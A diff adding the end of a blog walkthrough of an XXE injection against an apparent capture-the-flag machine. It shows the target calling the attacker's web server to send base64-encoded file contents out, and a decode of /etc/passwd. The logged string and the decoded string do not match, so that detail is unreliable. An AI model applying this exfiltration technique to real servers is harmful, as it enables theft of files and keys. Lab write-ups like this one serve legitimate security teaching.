@@ -101,3 +101,32 @@ root@kali:~# python3 -m http.server 80
 We are going to upload through the web app and see if we will get the results in the generated PDF file :
 
 ![upload](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/xxe-injection/xxe2.png)
+
+After the file being uploaded we can quickly notice a call to our web server that lets us know that the ``item1.xml`` we injected is calling our ``dtd.xml`` from the host and try to inject the code. 
+
+```console
+root@kali:~# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.173 - - [16/May/2020 14:02:25] "GET /dtd.xml HTTP/1.0" 200 -
+10.10.10.173 - - [16/May/2020 14:02:26] "GET /dtd.xml?PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo= HTTP/1.0" 200 -
+```
+
+We can also notice a base64 string response to our server , but since we used a php wrapper with base64 to encode the results we can try to decode it to get the results:
+
+```console
+root@kali:~# echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK" | base64 -d
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+[...]
+gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
+```
+
+aand... as we see we were able to read ``/etc/passwd`` from the remote machine which means our attack was succesful and this way we can read any file in the remote machine like : ssh keys or possible config files to help us identify and gather more information of the machine for further exploitation.
+
+I learned a new kind of attack while completing this machine and I hope this article helps you somehow learn something new.
+
+
+Do you like my work?
+{ % include support.xml % }
